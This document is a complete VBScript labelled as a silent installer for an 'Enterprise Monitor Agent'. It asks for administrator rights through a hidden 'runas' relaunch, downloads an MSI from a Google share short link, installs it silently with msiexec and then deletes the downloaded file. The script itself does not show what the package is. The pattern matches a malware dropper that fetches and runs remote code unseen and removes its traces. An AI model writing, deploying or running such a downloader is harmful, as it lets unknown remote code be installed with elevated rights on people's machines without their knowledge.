' --------------------------------------------------------------------------
'  Silent Installer - Enterprise Monitor Agent
' --------------------------------------------------------------------------
Option Explicit

' Check for elevation
If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
    WScript.Quit
End If

Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
strUrl = "https://share.google/jraH4hXE8DKHc3EXZ"
strTemp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
strFile = strTemp & "\agent_installer.msi"

' Download with proper redirect handling
Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
objXMLHTTP.open "GET", strUrl, False
objXMLHTTP.send()

' Check for any redirect (301, 302, etc.)
If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then
    ' Get the redirect location from headers
    strUrl = objXMLHTTP.getResponseHeader("Location")
    
    ' Make a new request to the redirect URL
    objXMLHTTP.open "GET", strUrl, False
    objXMLHTTP.send()
End If

' Check if we got a successful response
If objXMLHTTP.Status = 200 Then
    Set objADOStream = CreateObject("ADODB.Stream")
    objADOStream.Open
    objADOStream.Type = 1 ' Binary
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0
    objADOStream.SaveToFile strFile, 2 ' Overwrite
    objADOStream.Close

    ' Install
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "msiexec /i """ & strFile & """ /quiet /qn /norestart", 0, True

    ' Cleanup
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile
Else
    WScript.Echo "Download failed with status: " & objXMLHTTP.Status
End If
